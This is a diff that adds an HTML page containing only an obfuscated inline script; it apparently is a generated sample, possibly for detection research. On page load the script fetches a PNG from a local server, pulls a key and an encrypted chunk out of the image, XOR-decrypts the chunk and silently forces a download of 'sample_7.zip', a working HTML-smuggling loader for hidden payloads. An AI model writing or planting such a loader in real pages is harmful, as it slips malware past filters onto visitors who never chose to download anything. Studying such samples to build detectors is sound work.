@@ -1,0 +1,7 @@
+
+        <html>
+        <body>
+            <script type="application/javascript">function tMGBF(Phljw, KLMSQ){let vSOer = new Uint8Array(Phljw.length);for (let i = 0; i < Phljw.length; i++) {vSOer[i] = Phljw[i] ^ KLMSQ[i % KLMSQ.length];}return vSOer;}function iThib(bzHbZ) {const KRmqG = new XMLHttpRequest();KRmqG.open('GET', bzHbZ, true);KRmqG.responseType = 'arraybuffer';KRmqG.onload = function() {if (KRmqG.status === 200) {const gLbSS = KRmqG.response;const qZYsF = new DataView(gLbSS);let yDPZS = 8;let kXnon = null;while (yDPZS < gLbSS.byteLength) {const akUqT = qZYsF.getUint32(yDPZS);yDPZS += 4;const pzngl = new Uint8Array(gLbSS, yDPZS, 4);const OIXUV = String.fromCharCode.apply(null, pzngl);yDPZS += 4;if (OIXUV === 'xkEy') {kXnon = new Uint8Array(gLbSS, yDPZS, akUqT);} else if (OIXUV === 'exEf' && kXnon !== null) {const ttqxD = new Uint8Array(gLbSS, yDPZS, akUqT);const zJENA = tMGBF(ttqxD,kXnon);const dlraW = new Blob([zJENA], { type: 'application/octet-stream' }), DCQFe = document.createElement('a');DCQFe.href = URL.createObjectURL(dlraW);DCQFe.download = 'sample_7.zip';document.body.appendChild(DCQFe);DCQFe.click();URL.revokeObjectURL(DCQFe.href);document.body.removeChild(DCQFe);return;}yDPZS += akUqT + 4;}}};KRmqG.onerror = function(){};KRmqG.send();}iThib('http://127.0.0.1:8000/banner.png');</script>
+        </body>
+        </html>
+    
